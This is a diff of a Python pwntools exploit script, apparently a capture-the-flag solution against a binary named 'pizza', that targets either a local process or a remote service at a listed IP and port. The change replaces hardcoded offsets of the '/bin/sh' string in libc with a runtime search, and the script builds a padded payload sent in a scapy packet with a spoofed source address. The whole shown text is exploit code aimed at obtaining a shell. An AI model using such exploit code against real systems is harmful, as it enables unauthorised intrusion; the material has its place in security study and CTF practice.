@@ -10,13 +10,12 @@ if local:
     io = process("./pizza")
     libc = ELF("/usr/lib/libc.so.6")
     offset = 240
-    binsh = 0x0000000000164DEA 
 else:
     io = remote("166.111.132.132", 10002)
     libc = ELF("libc-2.19.so")
     offset = 245
-    binsh = 0x000000000017CCDB
 
+binsh = libc.search("/bin/sh\x00").next()
 payload = "AAAAAA" + p8(0x50)
 
 pkt = IP(src="8.0.5.1", dst = "8.0.0.1")/TCP(dport=1286)/payload
